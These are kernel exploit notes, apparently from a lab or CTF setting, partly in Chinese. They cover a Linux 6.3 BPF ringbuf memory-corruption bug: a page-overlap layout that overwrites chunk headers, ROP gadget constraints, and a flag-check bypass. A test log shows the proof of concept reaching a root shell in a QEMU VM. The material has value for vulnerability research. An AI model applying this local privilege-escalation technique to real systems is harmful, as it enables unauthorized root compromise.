**kernel version using**    
6.3 commit `457391b0380335d5e9a5babdec90ac53928b23b4`   

- buf大小选择16K，nr_meta_pages = 4, 这样[0, 0x1000] 与 [0x4000, 0x5000]是同一个page, 0x4000指向了chunk A's hdr
分配出A - [0, 0x3000], B - [0x3008, 0x6000], 通过B's 0x4000可以修改A的hdr meta数据。

```
		if (i >= nr_meta_pages)
			pages[nr_data_pages + i] = page;
```


所有的rop必须在[_stext, _etext]之间，否则会触发NX错误：  
```
81.766165] kernel tried to execute NX-protected page - exploit attempt? (uid: 1000)
[   81.792896] BUG: unable to handle page fault for address: ffffffff8299a052
[   81.810767] #PF: supervisor instruction fetch in kernel mode
[   81.823853] #PF: error_code(0x0011) - permissions violation
ts[0[  ] 81:. 853,6 socket248] PGD 3c46067 P4D 3c46067 PUD 3c47063 PMD 80000000028001e1
[   81.851043] Oops: 0011 [#1] PREEMPT SMP PTI
```

stack pivot rop 未找到rsp设置成功后避开+0x20的rop，+0x20处是flag，最低位为0x22可绕过:  
`irq_work_claim`有flag检查` if (oflags & IRQ_WORK_PENDING)`, 选择地址地末位是0x22的rop：`pop r13, pop r14, pop rbp, ret`

```
0x22 == CSD_TYPE_IRQ_WORK(0x20) | IRQ_WORK_BUSY (0x02);
IRQ_WORK_PENDING = 0x1
struct irq_work {
	struct __call_single_node node;
	void (*func)(struct irq_work *);
	struct rcuwait irqwait;
};

struct __call_single_node {
	struct llist_node	llist;
	union {
		unsigned int	u_flags;
		atomic_t	a_flags;
	};
#ifdef CONFIG_64BIT
	u16 src, dst;
#endif
};
```
*test:*   
```
$ ./poc
Hello World!
ringbuf after create map: 3
try to wait core
[   95.464768] BUG: scheduling while atomic: poc/354/0x00010002
[   95.478632] Modules linked in:

progfd: 4
sock[   95.486469] Preemption disabled at:
[   95.486474] [<ffffffff81310e23>] irq_work_queue+0x23/0x50
ets[0]: 5, socke[   95.508029] CPU: 1 PID: 354 Comm: poc Not tainted 6.3.0 #93
[   95.526632] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
t[1]: 6
[   95.599172] Call Trace:
[   95.677927] ------------[ cut here ]------------
[   95.683175] Voluntary context switch within RCU read-side critical section!
[   95.683816] WARNING: CPU: 1 PID: 354 at kernel/rcu/tree_plugin.h:318 rcu_note_context_switch+0x62c/0x690
[   95.713178] Modules linked in:
[   95.718262] CPU: 1 PID: 354 Comm: poc Tainted: G        W          6.3.0 #93
[   95.735521] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   95.752900] RIP: 0010:rcu_note_context_switch+0x62c/0x690
[   95.762138] Code: 00 00 00 00 0f 85 0d fd ff ff 49 89 8c 24 a0 00 00 00 e9 00 fd ff ff 48 c7 c7 a8 24 27 83 c6 05 75 08 ce 02 01 e8 a4 82 f6 ff <0f> 0b e9 3b fa ff ff 49 83 bc 24 98 00 00 00 00 49 8b 84 24 a0 00
[   95.793147] RSP: 0018:ffffc900009adf40 EFLAGS: 00010086
[   95.801582] RAX: 0000000000000000 RBX: ffff88813bcb3700 RCX: 0000000000000000
[   95.814821] RDX: 0000000000000003 RSI: 0000000000000027 RDI: 00000000ffffffff
[   95.828898] RBP: 0000000000000000 R08: 00000000ffffdfff R09: 0000000000000001
[   95.840645] R10: 00000000ffffdfff R11: ffffffff83c7afa0 R12: ffff88813bcb2880
[   95.854500] R13: ffff888102acb240 R14: 0000000000000000 R15: 0000000000000000
[   95.871507] FS:  0000000000da2380(0000) GS:ffff88813bc80000(0000) knlGS:0000000000000000
[   95.890278] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   95.901485] CR2: 00000000004b9000 CR3: 0000000102a02000 CR4: 0000000000050ee0
[   95.918447] Call Trace:
[   95.925747] ---[ end trace 0000000000000000 ]---
[   96.027876] poc[355]: segfault at 0 ip 000000000040248d sp 00007ffc781827d0 error 6 in poc[401000+89000] likely on CPU 1 (core 1, socket 0)
[   96.075993] Code: df e8 97 fb 01 00 ba 10 00 00 00 4c 89 ee 48 89 ef e8 47 ec ff ff 85 c0 0f 85 4f ff ff ff 48 8d 3d d6 7b 08 00 e8 03 46 00 00 <48> c7 04 25 00 00 00 00 00 00 00 00 0f 0b 0f 1f 44 00 00 f3 0f 1e
check core: /proc/sys/kernel/core_pattern
Root shell !!
FLAG{test-by-hxqu}
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@wintermute:/#
root@wintermute:/# whoami
root
```



when sweep consumer and producer,  as userspace to be the producer, and this time more memory can mapped to userspace

